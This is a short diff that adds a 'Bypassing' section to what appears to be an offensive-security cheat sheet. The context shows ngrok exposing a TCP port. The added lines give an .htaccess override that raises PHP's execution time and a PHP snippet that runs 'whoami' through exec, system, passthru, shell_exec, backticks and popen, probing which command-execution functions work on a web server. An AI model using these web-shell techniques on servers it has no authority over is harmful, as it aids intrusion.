@@ -80,3 +80,34 @@ ngrok authtoken  tokenishere #(Token can be got at https://ngrok.com/)
 ```
 ngrok tcp 1234 #1234 is your custom port number
 ```
+
+# Bypassing
+
+**Max Execution Time**
+>It can be bypassed with htaccess
+```
+<IfModule mod_php5.c>
+php_value max_execution_time 300
+</IfModule>
+```
+
+**PHP Functions**
+```
+<?php
+exec('whoami');
+system('whoami');
+passthru('whoami');
+shell_exec('whoami');
+echo `whoami`;
+$handle = popen("/bin/whoami 2>&1", "r");
+$output="";
+if($handle) {
+  while($tmp = fgets($handle))
+      $output .= $tmp;
+  $output .= "\n\nResult = " . pclose($handle);
+}
+else $output = "popen failed";
+echo $output;
+
+?>
+```
